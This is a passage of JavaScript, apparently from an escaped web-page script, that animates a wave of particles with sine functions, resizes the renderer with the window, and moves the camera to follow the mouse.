onDocumentMouseMove, false);\n    window.addEventListener(\"resize\", onWindowResize, false)\n  }\n\n  function onWindowResize() {\n    windowHalfX = window.innerWidth / 2;\n    windowHalfY = window.innerHeight / 2;\n    camera.aspect = window.innerWidth / window.innerHeight;\n    camera.updateProjectionMatrix();\n    renderer.setSize(window.innerWidth, window.innerHeight)\n  }\n\n  function onDocumentMouseMove(event) {\n    mouseX = event.clientX - windowHalfX\n  }\n\n  function animate() {\n    requestAnimationFrame(animate);\n    render()\n  }\n\n  function render() {\n    camera.position.x += (mouseX - camera.position.x) * 0.05;\n    camera.position.y = 362.05;\n    camera.lookAt({\n      x: scene.position.x,\n      y: window.innerHeight / 3,\n      z: scene.position.z\n    });\n    var i = 0;\n    for (var ix = 0; ix < AMOUNTX; ix++) {\n      for (var iy = 0; iy < AMOUNTY; iy++) {\n        particle = particles[i++];\n        particle.position.y = (Math.sin((ix + count) * 0.3) * 50) + (Math.sin((iy + count) * 0.5) * 50);\n        particle.scale.x = particle.scale.y = (Math.sin((ix + count) * 0.3) + 1) * 4 + (Math.sin((iy + count) * 0.5) + 1) * 4\n      }\n    }\n    renderer.render(scene, camera);\n    count += 0.1\n  }\n});"}]